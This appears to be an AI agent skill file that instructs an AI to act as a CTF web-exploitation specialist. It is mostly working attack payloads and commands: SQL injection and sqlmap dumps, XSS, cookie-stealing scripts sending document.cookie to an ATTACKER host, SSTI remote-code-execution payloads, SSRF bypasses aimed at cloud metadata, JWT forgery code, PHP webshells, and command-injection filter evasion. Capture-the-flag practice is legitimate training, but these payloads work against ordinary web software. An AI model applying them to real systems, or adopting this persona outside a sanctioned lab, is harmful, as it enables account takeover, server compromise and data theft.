---
name: web
description: >
  Web security exploitation specialist. Covers SQL injection, XSS, SSTI, SSRF,
  JWT attacks, file upload bypass, command injection, IDOR, CSRF, and race conditions.
metadata:
  user-invocable: "true"
  argument-hint: "[url-or-description]"
  category: web
---

# Web Security Exploitation

You are the web exploitation specialist for CTF challenges. Methodically probe the target, identify vulnerabilities, and exploit them to capture the flag.

## Reconnaissance

```bash
# Directory and file discovery
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,sql,zip
dirb http://TARGET /usr/share/wordlists/dirb/common.txt
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# Technology fingerprinting
curl -sI http://TARGET | head -20
nikto -h http://TARGET
whatweb http://TARGET

# Subdomain enumeration (if needed)
ffuf -u http://FUZZ.TARGET -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## SQL Injection

### Detection
```bash
# Manual probing
curl "http://TARGET/page?id=1'" 
curl "http://TARGET/page?id=1 OR 1=1--"
curl "http://TARGET/page?id=1 AND 1=1--"
curl "http://TARGET/login" -d "user=admin'--&pass=x"
```

### SQLMap
```bash
# Basic detection
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# Dump specific database
sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" -D dbname -T tablename --dump

# POST-based injection
sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --batch

# With cookie
sqlmap -u "http://TARGET/page?id=1" --cookie="session=abc123" --batch

# WAF bypass techniques
sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment,between --random-agent

# UNION-based extraction
sqlmap -u "http://TARGET/page?id=1" --technique=U --union-cols=5
```

### Manual UNION Injection
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,3 FROM users-- -
```

### Blind SQL Injection
```bash
# Boolean-based
curl "http://TARGET/page?id=1 AND (SELECT SUBSTRING(version(),1,1))='5'"
# Time-based
curl "http://TARGET/page?id=1 AND SLEEP(5)-- -"
```

## XSS (Cross-Site Scripting)

### Reflected XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(document.cookie)</script>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### Cookie Stealing
```html
<script>new Image().src="http://ATTACKER/"+document.cookie;</script>
<script>fetch("http://ATTACKER/?c="+document.cookie)</script>
```

### DOM XSS
```javascript
# Source: location.hash, location.search, document.referrer
# Sink: innerHTML, eval, document.write, setTimeout
# Test: http://TARGET/page#<img src=x onerror=alert(1)>
```

## SSTI (Server-Side Template Injection)

### Detection
```
{{7*7}}          → 49 (Jinja2/Twig)
${7*7}           → 49 (Freemarker/EL)
#{7*7}           → 49 (Thymeleaf/Ruby ERB-like)
<%= 7*7 %>       → 49 (ERB)
{{config}}       → dumps config (Jinja2)
```

### Jinja2 RCE
```python
# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /flag',shell=True,stdout=-1).communicate()[0]}}

# Find subprocess.Popen index
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag').read() }}{% endif %}{% endfor %}

# Compact payload
{{request.__class__.__mro__[1].__subclasses__()[INDEX]('cat /flag',shell=True,stdout=-1).communicate()[0]}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
```

### Twig RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
{{['cat /flag']|filter('system')}}
```

### ERB RCE
```erb
<%= system('cat /flag') %>
<%= `cat /flag` %>
<%= File.open('/flag').read %>
```

## SSRF (Server-Side Request Forgery)

```bash
# Internal service access
curl "http://TARGET/fetch?url=http://localhost:80"
curl "http://TARGET/fetch?url=http://127.0.0.1:8080/admin"
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata

# Bypass filters
http://0x7f000001/          # hex IP
http://0177.0.0.1/          # octal IP
http://[::1]/               # IPv6 loopback
http://127.1/               # shortened
http://127.0.0.1.nip.io/    # DNS rebinding
```

## JWT Attacks

### Decode JWT
```bash
# Cut and base64 decode
echo "HEADER" | base64 -d 2>/dev/null; echo
echo "PAYLOAD" | base64 -d 2>/dev/null; echo
# Or use jwt-cli
jwt decode TOKEN
```

### alg: none Attack
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."
print(token)
```

### Weak Secret Brute Force
```bash
# Using hashcat
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# Using jwt-cracker
jwt-cracker "TOKEN" "abc123" 6
```

### Key Confusion (RS256 → HS256)
```python
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"user":"admin"}, public_key, algorithm="HS256")
print(token)
```

## File Upload Bypass

```bash
# Extension bypass: .php5, .phtml, .phar, .php.jpg, .php%00.png
# Content-Type bypass: change to image/jpeg, image/png
# Magic bytes: prepend GIF89a to PHP file
# Double extension: shell.php.jpg (with Apache misconfig)
# .htaccess upload:
echo "AddType application/x-httpd-php .jpg" > .htaccess

# Webshell payloads
<?php system($_GET['cmd']); ?>
<?= system($_GET['cmd']); ?>
<script language="php">system($_GET['cmd']);</script>
```

## Command Injection

```bash
# Basic injection
; cat /flag
| cat /flag
$(cat /flag)
`cat /flag`
&& cat /flag
|| cat /flag

# Bypass spaces
cat${IFS}/flag
cat$IFS/flag
{cat,/flag}
cat</flag

# Bypass filters
c'a't /flag       # quoting
c\at /flag        # escaping
/bin/c?t /flag    # globbing
```

## IDOR (Insecure Direct Object Reference)

```bash
# Iterate over IDs
for i in $(seq 1 100); do
  curl -s -b "session=TOKEN" "http://TARGET/api/user/$i" | grep -i flag
done

# UUID brute force if predictable
ffuf -u "http://TARGET/api/user/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

## CSRF

```html
<form action="http://TARGET/action" method="POST">
  <input type="hidden" name="param" value="exploit">
</form>
<script>document.forms[0].submit();</script>
```

## Race Conditions

```bash
# Using burp intruder or turbo intruder
# Or parallel curl requests
for i in $(seq 1 20); do
  curl -s -b "session=TOKEN" "http://TARGET/transfer?to=attacker&amount=1000" &
done
wait
```

## Common CTF Flags Locations

```
/flag, /flag.txt, /root/flag.txt
Environment variables: env, printenv
Database: flags table, config table
Cookies (base64/encrypted)
Source code comments
robots.txt, .git/, .env, .svn/
```

## Quick Reference

| Technique | Tool | Command |
|-----------|------|---------|
| SQLi | sqlmap | `sqlmap -u URL --batch --dbs` |
| Dir brute | gobuster | `gobuster dir -u URL -w WORDLIST` |
| XSS test | manual | `<script>alert(1)</script>` |
| SSTI test | manual | `{{7*7}}` |
| JWT crack | hashcat | `hashcat -m 16500 token wordlist` |
| SSRF | curl | `curl URL?url=http://127.0.0.1` |
